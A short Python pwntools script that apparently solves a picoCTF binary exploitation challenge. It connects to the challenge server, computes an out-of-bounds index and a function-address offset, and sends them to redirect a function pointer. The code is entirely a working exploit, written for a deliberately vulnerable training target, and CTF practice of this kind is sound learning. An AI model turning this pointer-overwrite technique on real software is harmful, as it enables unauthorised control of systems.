from pwn import *

p = remote('saturn.picoctf.net', 53286)

payload = '~'*10+'M'
p.sendline(payload)

easy=0x080492fc
hard=0x08049436
fun=0x0804c080
check=0x0804c040

a = (check-fun)//4
b = easy-hard
print(a,b)
payload = f'{a} {b}'
p.sendline(payload.encode())

p.interactive()
